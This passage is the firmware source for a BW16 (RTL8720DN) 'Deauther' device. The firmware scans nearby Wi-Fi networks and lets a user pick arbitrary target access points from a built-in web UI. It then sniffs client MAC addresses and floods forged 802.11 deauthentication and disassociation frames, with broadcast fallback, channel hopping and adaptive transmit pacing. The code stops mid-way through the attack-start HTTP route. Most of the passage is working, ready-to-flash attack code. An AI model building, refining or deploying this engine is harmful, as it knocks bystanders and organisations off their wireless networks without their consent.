// ============================================================
//  BW16 Deauth-Only firmware  (RTL8720DN / AmebaD core 3.1.9)
// ------------------------------------------------------------
//  ONLY the Deauth attack is implemented:
//    * Wi-Fi scan (2.4 G + 5 G, strongest 16)
//    * target selection (up to 16 BSSIDs)
//    * continuous-sniffer unicast Deauth / Disassoc + broadcast
//      fallback (the engine proven in wifideauth v1.0.5)
//    * optional explicit client MAC (most reliable)
//    * self-test button (kicks devices on our own AP)
//    * live frame counters, event log, /api/dbg diagnostics
//  No Evil Portal / clone / captures / settings / DNS.
//  Fixed AP: BW16-Deauther / 0123456789, 2.4 GHz channel 1,
//  web UI at http://192.168.1.1/
// ============================================================
#include <Arduino.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <stddef.h>
#include <stdarg.h>
#include <ArduinoJson.h>
#include <FlashMemory.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "server_drv.h"
#include "wifi_tx.h"
#include "ui.h"

#define FW_VER      "1.0.5"
#define AP_IP_STR   "192.168.1.1"
#define MAX_NETS    16
#define MAX_ENG     16
#define EVT_RING    12
#define MAX_CLI     12

static char g_apSsid[] = "BW16-Deauther";
static char g_apPass[65] = "0123456789";   // changeable from the web UI, persisted
static char g_apChStr[] = "1";

// AP password persistence: the core's FlashMemory app area (0x00100000)
#define CFG_ADDR 0x00100000u
#define CFG_SIG  0x44415531u   // "DAU1"
static FlashMemoryClass* g_cfg = NULL;

// ---------------------------------------------------------------------
// Types (must precede every function definition: the Arduino sketch
// preprocessor hoists auto-generated prototypes to the first function)
struct NetEnt {
  char     ssid[33];
  uint8_t  bssid[6];
  int16_t  rssi;
  uint16_t ch;
  uint8_t  band5g;
  char     sec[9];
};
struct CliEnt {
  uint8_t  mac[6];
  uint8_t  bssid[6];
  uint16_t hits;
  uint32_t lastMs;
};
enum AtkPhase { AK_IDLE = 0, AK_HARVEST, AK_HOP, AK_RESTORE, AK_SEND, AK_WAIT };
struct Cfg {
  uint32_t sig;
  uint16_t crc;
  char     pass[65];
};

// ---------------------------------------------------------------------
// State
static NetEnt  g_nets[MAX_NETS];
static volatile int      g_netCnt = 0;
static volatile uint8_t  g_scanDone = 0;
static int      g_scanId = 0;
static bool     g_scanning = false;
static uint32_t g_scanStartMs = 0;
static volatile bool g_scanRequested = false;

static uint8_t  g_engT[MAX_ENG][6];
static uint16_t g_engCh[MAX_ENG];
static int      g_engN = 0;
static uint8_t  g_engMethod = 1;
static uint32_t g_engInterval = 200;
static uint32_t g_engNextMs = 0;
static uint32_t g_engFrames = 0;
static uint32_t g_engTxFail = 0;
static int      g_atkPace = 20;
static bool     g_engOn = false;
static int      g_atkN = 0;
static int      g_atkIdx[MAX_ENG];

static CliEnt  g_cli[MAX_CLI];
static volatile int      g_cliCnt = 0;
static volatile uint32_t g_promiscFrames = 0;
static uint8_t  g_manMac[6];
static bool     g_manMacSet = false;

static AtkPhase g_atkPhase = AK_IDLE;
static AtkPhase g_atkPhaseSeen = AK_IDLE;
static uint32_t g_atkPhaseMs = 0;
static uint32_t g_atkUntil = 0;
static uint32_t g_atkStartMs = 0;
static uint32_t g_harvFramesAtStart = 0;
static int      g_atkHop = 0;
static int      g_atkCycle = 0;
static int      g_atkChanN = 0;
static int      g_atkRestoreRetry = 0;
static uint16_t g_atkCh[MAX_ENG];
static bool     g_promiscOk = false;
static bool     g_promiscOn = false;

static char     g_apSsidDisp[33] = "";
static uint8_t  g_apChannel = 1;
static bool     g_apOnline = false;

static uint8_t  g_clientCount = 0;
static uint8_t  g_clientMacs[5][6];
static uint32_t g_clientRefreshMs = 0;

static char     g_evt[EVT_RING][72];
static char     g_evtLvl[EVT_RING];
static int      g_evtSeq = 0;
static uint32_t g_bootMs = 0;
static bool     g_restorePending = false;

static char g_jsonBuf[4200];
static char g_respBuf[256];

// serial trace switch (plain define; never wrap functions in #if)
#define WD_TRACE 1

// forward declarations (functions used before their definition)
static void stopEngineOnly();
static bool apRebuild();
static bool apRebuildCh(int ch);

// ---------------------------------------------------------------------
// Utilities
static void dlog(const char* fmt, ...) {
  if (!WD_TRACE) return;
  char b[160];
  va_list ap;
  va_start(ap, fmt);
  vsnprintf(b, sizeof b, fmt, ap);
  va_end(ap);
  Serial.print("[DA ");
  Serial.print((unsigned long)(millis() / 1000));
  Serial.print("s] ");
  Serial.println(b);
  Serial.flush();
}

static void macToStr(const uint8_t* m, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void sanitizeSsid(char* dst, const unsigned char* src, int maxlen) {
  int n = 0;
  for (int i = 0; i < maxlen && src[i]; i++) {
    unsigned char c = src[i];
    dst[n++] = (c >= 32 && c < 127) ? (char)c : '?';
  }
  dst[n] = 0;
}

static const char* secLabel(unsigned long s) {
  if (s & WPA2_SECURITY) return (s & WPA_SECURITY) ? "wpa/wpa2" : "wpa2";
  if (s & WPA_SECURITY)  return "wpa";
  if (s & WEP_ENABLED)   return "wep";
  return "open";
}

extern "C" size_t xPortGetFreeHeapSize(void) __attribute__((weak)); // FreeRTOS heap
static uint32_t freeHeap() {
  size_t (*fp)(void) = &xPortGetFreeHeapSize;
  return fp ? (uint32_t)fp() : 0u;
}

static void logEv(const char* msg, char lvl) {
  int slot = g_evtSeq % EVT_RING;
  snprintf(g_evt[slot], sizeof g_evt[0], "%s", msg);
  g_evtLvl[slot] = lvl;
  g_evtSeq++;
}

// CRC-16/CCITT-FALSE for the persisted password record
static uint16_t crc16(const uint8_t* d, int n) {
  uint16_t c = 0xFFFF;
  for (int i = 0; i < n; i++) {
    c ^= (uint16_t)d[i] << 8;
    for (int k = 0; k < 8; k++) c = (c & 0x8000) ? (uint16_t)((c << 1) ^ 0x1021) : (uint16_t)(c << 1);
  }
  return c;
}

static bool cfgLoad() {
  if (!g_cfg) return false;
  g_cfg->read();
  Cfg* c = (Cfg*)g_cfg->buf;
  if (c->sig != CFG_SIG) return false;
  if (crc16((const uint8_t*)c->pass, sizeof c->pass) != c->crc) return false;
  if (c->pass[0] == 0) return false;
  snprintf(g_apPass, sizeof g_apPass, "%s", c->pass);
  return true;
}

static void cfgSave() {
  if (!g_cfg) return;
  Cfg c;
  memset(&c, 0, sizeof c);
  c.sig = CFG_SIG;
  snprintf(c.pass, sizeof c.pass, "%s", g_apPass);
  c.crc = crc16((const uint8_t*)c.pass, sizeof c.pass);
  g_cfg->read();
  memcpy(g_cfg->buf, &c, sizeof c);
  g_cfg->update();
}

// Onboard RGB LED (variant pins LED_R/LED_G/LED_B). If your board lights the
// channels the other way round, flip these two macros.
#define LED_LEVEL_ON   HIGH
#define LED_LEVEL_OFF  LOW
static void ledSet(uint8_t r, uint8_t g, uint8_t b) {
  digitalWrite(LED_R, r ? LED_LEVEL_ON : LED_LEVEL_OFF);
  digitalWrite(LED_G, g ? LED_LEVEL_ON : LED_LEVEL_OFF);
  digitalWrite(LED_B, b ? LED_LEVEL_ON : LED_LEVEL_OFF);
}

static void ledUpdate() {
  static uint8_t last = 0xFF;
  uint8_t st = 0;                       // 0 idle, 1 = 2.4G attack, 2 = 5G attack
  if (g_engOn) {
    bool has24 = false;
    for (int i = 0; i < g_engN; i++) if (g_engCh[i] <= 14) has24 = true;
    st = has24 ? 1 : 2;
  }
  if (st == last) return;
  last = st;
  if (st == 0)      ledSet(0, 1, 0);
  else if (st == 1) ledSet(1, 0, 0);
  else              ledSet(0, 0, 1);
}

static const char* modeStr() {
  if (g_scanning) return "scanning";
  return (g_atkPhase != AK_IDLE || g_engOn) ? "attack" : "idle";
}

// ---------------------------------------------------------------------
// Scan
// rtw_scan_result_handler_t is rtw_result_t(*)(rtw_scan_handler_result_t*)
static rtw_result_t scanHandler(rtw_scan_handler_result_t* res) {
  if (res == NULL) return 0;
  if (res->scan_complete) { g_scanDone = 1; return 0; }
  rtw_scan_result_t* a = &res->ap_details;
  if (a->SSID.len == 0 || a->SSID.len > 32) return 0;
  int n = g_netCnt;
  int16_t rr = (int16_t)a->signal_strength;
  int pos;
  for (int i = 0; i < n; i++) {          // dedupe by BSSID, re-bubble on boost
    if (memcmp(g_nets[i].bssid, a->BSSID.octet, 6) == 0) {
      if (rr > g_nets[i].rssi) {
        g_nets[i].rssi = rr;
        int j = i;
        while (j > 0 && g_nets[j].rssi > g_nets[j - 1].rssi) {
          NetEnt tmp = g_nets[j]; g_nets[j] = g_nets[j - 1]; g_nets[j - 1] = tmp; j--;
        }
      }
      return 0;
    }
  }
  if (n < MAX_NETS) {                    // table kept sorted RSSI-desc
    pos = n;
    while (pos > 0 && rr > g_nets[pos - 1].rssi) pos--;
    for (int i = n; i > pos; i--) g_nets[i] = g_nets[i - 1];
  } else {
    if (rr <= g_nets[MAX_NETS - 1].rssi) return 0;
    pos = MAX_NETS - 1;
    while (pos > 0 && rr > g_nets[pos - 1].rssi) pos--;
    for (int i = MAX_NETS - 1; i > pos; i--) g_nets[i] = g_nets[i - 1];
  }
  NetEnt& e = g_nets[pos];
  sanitizeSsid(e.ssid, a->SSID.val, 31);
  memcpy(e.bssid, a->BSSID.octet, 6);
  e.rssi = rr;
  e.ch = (uint16_t)a->channel;
  // band from the channel (the driver's band field is unreliable)
  e.band5g = (e.ch > 14) ? 1 : 0;
  snprintf(e.sec, sizeof e.sec, "%s", secLabel((unsigned long)a->security));
  if (n < MAX_NETS) g_netCnt = n + 1;
  return 0;
}

static void startScan() {
  stopEngineOnly();
  g_netCnt = 0;
  g_scanDone = 0;
  g_scanning = true;
  g_scanStartMs = millis();
  int r = wifi_scan_networks(scanHandler, NULL);
  if (r != 0) {
    g_scanning = false;
    char m[64];
    snprintf(m, sizeof m, "扫描启动失败 (%d)", r);
    logEv(m, 'e');
  } else {
    logEv("开始扫描…", 'i');
  }
}

static void scanTick() {
  if (!g_scanning) return;
  if (g_scanDone) {
    g_scanning = false;
    g_scanId++;
    apRebuild();                       // radio blip recovery after the scan
    char m[72];
    snprintf(m, sizeof m, "扫描完成，发现 %d 个网络", g_netCnt);
    logEv(m, 'o');
    return;
  }
  if (millis() - g_scanStartMs > 40000) {
    g_scanning = false;
    g_scanId++;
    apRebuild();
    logEv("扫描超时，已恢复 AP", 'e');
  }
}

// ---------------------------------------------------------------------
// AP management
static void httpStart();
static void httpStopSrv();

static bool apRebuild() {
  httpStopSrv();
  int st = WiFi.apbegin(g_apSsid, g_apPass, g_apChStr);
  if (st != WL_CONNECTED) {
    delay(300);
    st = WiFi.apbegin(g_apSsid, g_apPass, g_apChStr);
    if (st != WL_CONNECTED) {
      logEv("AP 启动失败", 'e');
      return false;
    }
  }
  g_apChannel = 1;
  snprintf(g_apSsidDisp, sizeof g_apSsidDisp, "%s", g_apSsid);
  g_apOnline = true;
  httpStart();
  return true;
}

// Move the softAP to another channel WITHOUT tearing it down: the SDK sends a
// CSA so associated clients follow. This is the difference between "weird
// hotspot disappears" and a smooth hop. Falls back to a full rebuild.
static bool apSetChannel(int ch) {
  if (ch == (int)g_apChannel) return true;
  if (wifi_ap_switch_chl_and_inform((unsigned char)ch) == 0) {
    g_apChannel = (uint8_t)ch;
    return true;
  }
  return apRebuildCh(ch);
}

static bool apRebuildCh(int ch) {
  char chs[8];
  snprintf(chs, sizeof chs, "%d", ch);
  httpStopSrv();
  int st = WiFi.apbegin(g_apSsid, g_apPass, chs);
  if (st != WL_CONNECTED) {
    delay(300);
    st = WiFi.apbegin(g_apSsid, g_apPass, chs);
    if (st != WL_CONNECTED) return false;
  }
  g_apChannel = (uint8_t)ch;
  g_apOnline = true;
  httpStart();
  return true;
}

static void clientsRefresh() {
  unsigned char buf[sizeof(rtw_maclist_t) + 5 * sizeof(rtw_mac_t)];
  memset(buf, 0, sizeof buf);
  rtw_maclist_t* ml = (rtw_maclist_t*)buf;
  if (wifi_get_associated_client_list(buf, (unsigned short)sizeof buf) == 0) {
    int c = (int)ml->count;
    if (c < 0) c = 0;
    if (c > 5) c = 5;
    g_clientCount = (uint8_t)c;
    for (int i = 0; i < c; i++) memcpy(g_clientMacs[i], ml->mac_list[i].octet, 6);
  } else {
    g_clientCount = 0;
  }
}

// ---------------------------------------------------------------------
// Deauth engine: continuous sniffer + unicast Deauth/Disassoc.
// The sniffer is enabled once at attack start and stays on; client MACs
// accumulate (randomised MACs re-appear within seconds) and the table
// evicts the stalest entry when full.
static void promiscCb(unsigned char* buf, unsigned int len, void* userdata) {
  (void)userdata;
  g_promiscFrames++;
  if (len < 24 || g_engN <= 0) return;
  const unsigned char* a1 = buf + 4;
  const unsigned char* a2 = buf + 10;
  if ((buf[0] & 0x0C) != 0x08) return;      // 802.11 data frames only
  const uint8_t* bssid = NULL;
  const uint8_t* cli = NULL;
  for (int i = 0; i < g_engN; i++) {
    if (memcmp(a2, g_engT[i], 6) == 0) { bssid = g_engT[i]; cli = a1; break; }  // AP -> STA
    if (memcmp(a1, g_engT[i], 6) == 0) { bssid = g_engT[i]; cli = a2; break; }  // STA -> AP
  }
  if (bssid == NULL || cli == NULL) return;
  if (cli[0] & 1) return;                   // group address
  if (memcmp(cli, bssid, 6) == 0) return;
  int n = g_cliCnt;
  for (int i = 0; i < n; i++) {
    if (memcmp(g_cli[i].mac, cli, 6) == 0) {
      if (g_cli[i].hits < 60000) g_cli[i].hits++;
      g_cli[i].lastMs = millis();
      return;
    }
  }
  if (n >= MAX_CLI) {                       // keep the freshest MACs
    int oldest = 0;
    for (int i = 1; i < n; i++) if (g_cli[i].lastMs < g_cli[oldest].lastMs) oldest = i;
    memcpy(g_cli[oldest].mac, cli, 6);
    memcpy(g_cli[oldest].bssid, bssid, 6);
    g_cli[oldest].hits = 1;
    g_cli[oldest].lastMs = millis();
    return;
  }
  memcpy(g_cli[n].mac, cli, 6);
  memcpy(g_cli[n].bssid, bssid, 6);
  g_cli[n].hits = 1;
  g_cli[n].lastMs = millis();
  g_cliCnt = n + 1;
}

static void stopEngineOnly() {
  g_engOn = false;
  g_engN = 0;
  g_atkN = 0;
  g_atkPhase = AK_IDLE;
  if (g_promiscOn) {
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    g_promiscOn = false;
  }
}

static void engineStart(int n, const uint8_t(*bssid)[6], const uint16_t* ch,
                        uint8_t method, uint32_t intervalMs) {
  if (n > MAX_ENG) n = MAX_ENG;
  g_engN = n;
  for (int i = 0; i < n; i++) {
    memcpy(g_engT[i], bssid[i], 6);
    g_engCh[i] = ch[i];
  }
  g_engMethod = method;
  g_engInterval = intervalMs < 100 ? 100 : (intervalMs > 5000 ? 5000 : intervalMs);
  g_engFrames = 0;
  g_engTxFail = 0;
  g_atkPace = 20;
  g_engNextMs = millis() + 300;
  g_engOn = true;
  g_cliCnt = 0;
  g_promiscFrames = 0;
  g_atkCycle = 0;
  g_atkHop = 0;
  g_atkChanN = 0;
  g_atkPhase = AK_HARVEST;
  g_atkUntil = millis() + 800;            // let the HTTP reply leave first
  g_atkStartMs = millis();
  g_atkPhaseSeen = AK_HARVEST;
  g_atkPhaseMs = millis();
  g_atkRestoreRetry = 0;
}

static int atkChannels(uint16_t* out) {
  int n = 0;
  for (int i = 0; i < g_engN; i++) {
    bool dup = false;
    for (int k = 0; k < n; k++) if (out[k] == g_engCh[i]) { dup = true; break; }
    if (!dup && n < MAX_ENG) out[n++] = g_engCh[i];
  }
  return n;
}

// One injected frame with success accounting (alloc_mgtxmitframe can fail
// when the driver TX pool is dry - a silent "counter grows but nothing is
// transmitted" failure mode that must be paced against).
static bool txFrame(bool deauth, const uint8_t* bssid, const void* dst, uint16_t reason) {
  bool ok = deauth ? wifi_tx_deauth_frame((void*)bssid, (void*)dst, reason)
                   : wifi_tx_disassoc_frame((void*)bssid, (void*)dst, reason);
  if (ok) g_engFrames++; else g_engTxFail++;
  return ok;
}

static void attackTick() {
  if (!g_engOn || g_scanning) return;
  if (g_atkPhase == AK_IDLE) return;
  uint32_t now = millis();
  if (g_atkPhase != g_atkPhaseSeen) {
    g_atkPhaseSeen = g_atkPhase;
    g_atkPhaseMs = now;
  }

  if (g_atkPhase == AK_HARVEST) {
    if ((int32_t)(now - g_atkUntil) < 0) return;
    g_atkChanN = atkChannels(g_atkCh);
    if (g_atkChanN == 0) { g_atkPhase = AK_SEND; return; }
    // all targets on one foreign channel: move the AP there (smooth CSA hop)
    if (g_atkChanN == 1 && g_atkCh[0] != g_apChannel) {
      char pm[72];
      if (apSetChannel((int)g_atkCh[0])) {
        snprintf(pm, sizeof pm, "热点已切到目标信道 %d（客户端平滑跟随）", (int)g_atkCh[0]);
        logEv(pm, 'o');
      } else {
        apRebuild();
        snprintf(pm, sizeof pm, "信道切换失败，保持原信道 %d", (int)g_apChannel);
        logEv(pm, 'w');
      }
    }
    g_atkHop = 0;
    g_atkUntil = now;
    g_harvFramesAtStart = g_promiscFrames;
    // light promisc only (NEVER wifi_enter_promisc_mode: it tears the AP down)
    if (wifi_set_promisc(RTW_PROMISC_ENABLE_2, promiscCb, 0) == 0) { g_promiscOk = true; g_promiscOn = true; }
    else { g_promiscOk = false; logEv("嗅探不可用，改用广播 Deauth", 'w'); }
    g_atkPhase = AK_HOP;
    return;
  }

  if (g_atkPhase == AK_HOP) {
    if ((int32_t)(now - g_atkUntil) < 0) return;
    if (g_atkHop >= g_atkChanN) {
      char m[72];
      if (g_promiscFrames == g_harvFramesAtStart) {
        snprintf(m, sizeof m, "嗅探暂未收到帧：先按广播/已填 MAC 攻击");
        logEv(m, 'w');
      } else {
        snprintf(m, sizeof m, "嗅探持续累积：当前捕获 %d 个客户端", (int)g_cliCnt);
        logEv(m, 'o');
      }
      g_atkPhase = AK_SEND;
      return;
    }
    wifi_set_channel(g_atkCh[g_atkHop]);
    g_atkHop++;
    g_atkUntil = now + 1200;
    return;
  }

  if (g_atkPhase == AK_RESTORE) {
    if (apRebuild()) g_atkPhase = AK_SEND;
    else if (++g_atkRestoreRetry >= 3) {
      logEv("AP 恢复失败，重启设备", 'e');
      wdt_enable(600);
      for (;;) delay(20);
    }
    return;
  }

  if (g_atkPhase == AK_SEND) {
    static const uint8_t bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
    uint32_t dur = g_engInterval < 120 ? 120 : (g_engInterval > 300 ? 300 : g_engInterval);
    uint32_t burstEnd = millis() + dur;
    for (int c = 0; c < g_atkChanN && (int32_t)(millis() - burstEnd) < 0; c++) {
      uint16_t ch = g_atkCh[c];
      if (ch != g_apChannel) wext_set_channel(WLAN0_NAME, (unsigned char)ch);
      while ((int32_t)(millis() - burstEnd) < 0) {
        int ok = 0, fail = 0;
        for (int t = 0; t < g_engN; t++) {
          if (g_engCh[t] != ch) continue;
          bool hit = false;
          if (g_manMacSet) {                    // explicit MAC from the UI
            if (g_engMethod & 1) { if (txFrame(true, g_engT[t], g_manMac, 0x07)) ok++; else fail++; }
            if (g_engMethod & 2) { if (txFrame(false, g_engT[t], g_manMac, 0x07)) ok++; else fail++; }
            hit = true;
          }
          for (int k = 0; k < g_cliCnt; k++) {  // sniffed clients
            if (memcmp(g_cli[k].bssid, g_engT[t], 6) != 0) continue;
            if (g_engMethod & 1) { if (txFrame(true, g_engT[t], g_cli[k].mac, 0x07)) ok++; else fail++; }
            if (g_engMethod & 2) { if (txFrame(false, g_engT[t], g_cli[k].mac, 0x07)) ok++; else fail++; }
            hit = true;
          }
          if (!hit) {                            // broadcast fallback
            if (g_engMethod & 1) { if (txFrame(true, g_engT[t], (void*)bcast, 0x07)) ok++; else fail++; }
            if (g_engMethod & 2) { if (txFrame(false, g_engT[t], (void*)bcast, 0x07)) ok++; else fail++; }
          }
        }
        if (fail > ok && g_atkPace < 150) g_atkPace += 10;
        else if (fail == 0 && g_atkPace > 20) g_atkPace -= 4;
        delay(g_atkPace);
        if ((millis() - burstEnd) > 2000) break;
      }
    }
    if (g_apChannel) wext_set_channel(WLAN0_NAME, g_apChannel);
    g_atkCycle++;
    g_engNextMs = millis() + g_engInterval;
    g_atkPhase = AK_WAIT;
    return;
  }

  if (g_atkPhase == AK_WAIT) {
    if ((int32_t)(now - g_engNextMs) < 0) return;
    g_atkPhase = AK_SEND;      // sniffer stays on: no re-sweep needed
  }
}

// ---------------------------------------------------------------------
// JSON nets
static void jsonNets(JsonArray arr) {
  int n = g_netCnt;
  if (n > MAX_NETS) n = MAX_NETS;
  for (int i = 0; i < n; i++) {
    JsonObject no = arr.add<JsonObject>();
    no["i"] = i;
    no["s"] = g_nets[i].ssid;
    no["ch"] = (int)g_nets[i].ch;
    no["r"] = (int)g_nets[i].rssi;
    char ms[18]; macToStr(g_nets[i].bssid, ms);
    no["m"] = ms;
    no["e"] = g_nets[i].sec;
    no["b"] = g_nets[i].band5g;
  }
}

// ---------------------------------------------------------------------
// Minimal HTTP/1.1 server on ServerDrv (see wifideauth for the rationale:
// byte-wise body writes + drain-before-close, both battle-tested)
class MiniHttp {
public:
  ServerDrv drv;
  int lfd = -1;
  char reqRaw[1536];
  int  reqLen;
  char body[768];
  int  bodyLen;
  char method[8];
  char path[160];
  uint32_t peerIp;
  char peerIpStr[16];
  uint32_t seen = 0, fail = 0;
  int lastCode = 0;
  char dbgLast[160] = "";

  bool start() {
    if (lfd >= 0) return true;
    lfd = drv.startServer(80, TCP_MODE, NON_BLOCKING_MODE);
    return lfd >= 0;              // net_port 0 is VALID; -1 means failure
  }
  void stop() {
    if (lfd >= 0) { drv.stopSocket(lfd); lfd = -1; }
  }

  bool serveOne() {
    if (lfd < 0) return false;
    int cfd = drv.getAvailable(lfd);
    if (cfd <= 0) return false;
    bool ok = readRequest(cfd);
    seen++;
    if (ok) {
      dlog("REQ %s %s", method, path);
      handleRoute(cfd);
      snprintf(dbgLast, sizeof dbgLast, "%s %s ok code=%d", method, path, lastCode);
    } else {
      fail++;
      snprintf(dbgLast, sizeof dbgLast, "PARSE-FAIL len=%d head=[%.100s]", reqLen, reqRaw);
      logEv("HTTP 请求解析失败", 'e');
    }
    uint8_t junk[128];
    for (int i = 0; i < 4; i++) {
      if (drv.getDataBuf(cfd, junk, sizeof junk) <= 0) break;
    }
    drv.stopSocket(cfd);
    return true;
  }

private:
  static int findHdrEnd(const char* b, int n) {
    for (int i = 0; i + 3 < n; i++)
      if (b[i] == '\r' && b[i+1] == '\n' && b[i+2] == '\r' && b[i+3] == '\n') return i + 4;
    for (int i = 0; i + 1 < n; i++)
      if (b[i] == '\n' && b[i+1] == '\n') return i + 2;
    return -1;
  }

  bool readRequest(int cfd) {
    memset(reqRaw, 0, sizeof reqRaw);
    reqLen = 0;
    body[0] = 0; bodyLen = 0;
    method[0] = 0; path[0] = 0;
    peerIp = 0; peerIpStr[0] = 0;
    uint32_t deadline = millis() + 1200;
    int hdrEnd = -1;
    int contentLen = 0;
    bool headersDone = false;
    uint16_t dummyPort = 0;
    while ((int32_t)(millis() - deadline) < 0) {
      int r = drv.getDataBuf(cfd, (uint8_t*)reqRaw + reqLen, 512);
      if (r > 0) {
        reqLen += r;
        if (reqLen >= (int)sizeof reqRaw - 1) { reqLen = sizeof reqRaw - 1; break; }
      } else if (r < 0) {
        if (reqLen == 0) return false;
        break;
      } else {
        delay(5);
      }
      if (!headersDone) {
        hdrEnd = findHdrEnd(reqRaw, reqLen);
        if (hdrEnd > 0) {
          headersDone = true;
          extractFirstLine();
          contentLen = hdrInt("content-length");
          if (contentLen < 0) contentLen = 0;
          if (contentLen > (int)sizeof body - 1) contentLen = (int)sizeof body - 1;
          drv.getRemoteData(cfd, &peerIp, &dummyPort);
          snprintf(peerIpStr, sizeof peerIpStr, "%u.%u.%u.%u",
                   (unsigned)(peerIp & 0xFF), (unsigned)((peerIp >> 8) & 0xFF),
                   (unsigned)((peerIp >> 16) & 0xFF), (unsigned)((peerIp >> 24) & 0xFF));
        }
      }
      if (headersDone) {
        int have = reqLen - hdrEnd;
        if (have > 0) {
          if (have > contentLen) have = contentLen;
          memcpy(body, reqRaw + hdrEnd, have);
          bodyLen = have;
        }
        if (bodyLen >= contentLen) break;
      }
    }
    if (!headersDone || method[0] == 0 || path[0] == 0) return false;
    body[bodyLen] = 0;
    return true;
  }

  int hdrInt(const char* name) {
    char v[12];
    if (hdrStr(name, v, sizeof v) < 0) return -1;
    return atoi(v);
  }

  int hdrStr(const char* name, char* out, int cap) {
    int n = (int)strlen(name);
    for (int i = 0; i + n < reqLen; i++) {
      if (i > 0 && reqRaw[i - 1] != '\n') continue;
      bool eq = true;
      for (int k = 0; k < n; k++) {
        char a = reqRaw[i + k], b = name[k];
        if (a >= 'A' && a <= 'Z') a += 32;
        if (a != b) { eq = false; break; }
      }
      if (!eq) continue;
      int j = i + n;
      while (j < reqLen && (reqRaw[j] == ' ' || reqRaw[j] == ':')) j++;
      int o = 0;
      while (j < reqLen && reqRaw[j] != '\r' && reqRaw[j] != '\n' && o < cap - 1) out[o++] = reqRaw[j++];
      out[o] = 0;
      return o;
    }
    return -1;
  }

  void extractFirstLine() {
    char* sp1 = strchr(reqRaw, ' ');
    if (!sp1) return;
    int mlen = (int)(sp1 - reqRaw);
    if (mlen > 7) mlen = 7;
    memcpy(method, reqRaw, mlen); method[mlen] = 0;
    char* sp2 = strchr(sp1 + 1, ' ');
    int plen = sp2 ? (int)(sp2 - sp1 - 1) : (int)strlen(sp1 + 1);
    if (plen > (int)sizeof path - 1) plen = sizeof path - 1;
    memcpy(path, sp1 + 1, plen); path[plen] = 0;
    if (strncmp(path, "http://", 7) == 0) {
      char* sl = strchr(path + 7, '/');
      if (sl) memmove(path, sl, strlen(sl) + 1);
      else strcpy(path, "/");
    }
  }

  bool sendRaw(int cfd, const char* data, int len) {
    const uint8_t* p = (const uint8_t*)data;
    int sent = 0;
    while (sent < len) {
      int tries = 0;
      while (!drv.sendData(cfd, p + sent, 1)) {
        if (++tries > 250 || !g_apOnline) { dlog("send fail at %d/%d", sent, len); return false; }
        delay(1);
      }
      sent++;
    }
    return true;
  }

  void sendResp(int cfd, int code, const char* ctype, const char* body, int len, const char* extra) {
    lastCode = code;
    if (len < 0) len = (int)strlen(body);
    int hlen = snprintf(g_respBuf, sizeof g_respBuf,
      "HTTP/1.1 %d %s\r\nContent-Type: %s\r\nContent-Length: %d\r\n"
      "Connection: close\r\nCache-Control: no-store\r\n%s\r\n",
      code, code == 200 ? "OK" : (code == 204 ? "No Content" : (code == 302 ? "Found" : (code == 401 ? "Unauthorized" : (code == 400 ? "Bad Request" : "Error")))),
      ctype, len, extra ? extra : "");
    sendRaw(cfd, g_respBuf, hlen);
    if (len > 0) sendRaw(cfd, body, len);
  }

  void sendHtml(int cfd, const char* html)             { sendResp(cfd, 200, "text/html; charset=utf-8", html, -1, NULL); }
  void sendJsonRaw(int cfd, int code, const char* json) { sendResp(cfd, code, "application/json", json, -1, NULL); }

  void handleRoute(int cfd);
};

static MiniHttp g_http;

static void httpStart() {
  bool ok = g_http.start();
  dlog("http listen lfd=%d ok=%d", g_http.lfd, ok ? 1 : 0);
}
static void httpStopSrv() { g_http.stop(); }

// ---------------------------------------------------------------------
// Routes
void MiniHttp::handleRoute(int cfd) {
  const char* p = path;
  bool isGet = strcmp(method, "GET") == 0;
  bool isPost = strcmp(method, "POST") == 0;

  if (strcmp(p, "/api/status") == 0 && isGet) {
    JsonDocument d;
    JsonObject o = d.to<JsonObject>();
    o["fw"] = FW_VER;
    o["mode"] = modeStr();
    o["uptime"] = (uint32_t)(millis() / 1000);
    o["heap"] = freeHeap();
    JsonObject ap = o["ap"].to<JsonObject>();
    ap["ssid"] = g_apSsidDisp;
    ap["ip"] = AP_IP_STR;
    ap["clients"] = (int)g_clientCount;
    JsonArray am = ap["cliMacs"].to<JsonArray>();
    for (int i = 0; i < (int)g_clientCount; i++) {
      char ms[18]; macToStr(g_clientMacs[i], ms);
      am.add(ms);
    }
    JsonObject atk = o["attack"].to<JsonObject>();
    atk["running"] = (g_atkPhase != AK_IDLE && g_engOn);
    atk["frames"] = g_engFrames;
    atk["txfail"] = g_engTxFail;
    atk["clients"] = (int)g_cliCnt;
    JsonArray tg = atk["targets"].to<JsonArray>();
    for (int i = 0; i < g_atkN; i++) tg.add(g_atkIdx[i]);
    JsonObject sc = o["scan"].to<JsonObject>();
    sc["id"] = g_scanId;
    sc["running"] = g_scanning;
    JsonArray ev = o["ev"].to<JsonArray>();
    for (int k = 0; k < 8; k++) {
      int seq = g_evtSeq - 1 - k;
      if (seq < 0) break;
      int idx = ((seq % EVT_RING) + EVT_RING) % EVT_RING;
      if (g_evt[idx][0] == 0) continue;
      JsonArray e = ev.add<JsonArray>();
      e.add(seq);
      e.add(g_evt[idx]);
      char lv[2] = { g_evtLvl[idx] ? g_evtLvl[idx] : 'i', 0 };
      e.add(lv);
    }
    if (!g_scanning) jsonNets(o["nets"].to<JsonArray>());
    serializeJson(d, g_jsonBuf);
    sendJsonRaw(cfd, 200, g_jsonBuf);
    return;
  }

  if (strcmp(p, "/api/scan") == 0) {
    if (isGet) {
      JsonDocument d;
      jsonNets(d.to<JsonObject>()["nets"].to<JsonArray>());
      serializeJson(d, g_jsonBuf);
      sendJsonRaw(cfd, 200, g_jsonBuf);
    } else if (isPost) {
      if (g_scanning || g_scanRequested) { sendJsonRaw(cfd, 400, "{\"err\":\"scanning\"}"); return; }
      g_scanRequested = true;
      sendJsonRaw(cfd, 200, "{\"started\":true}");
    } else sendJsonRaw(cfd, 400, "{\"err\":\"method\"}");
    return;
  }

  if (strcmp(p, "/api/attack/start") == 0 && isPost) {
    if (g_scanning) { sendJsonRaw(cfd, 400, "{\"err\":\"扫描进行中\"}"); return; }
    JsonDocument d;
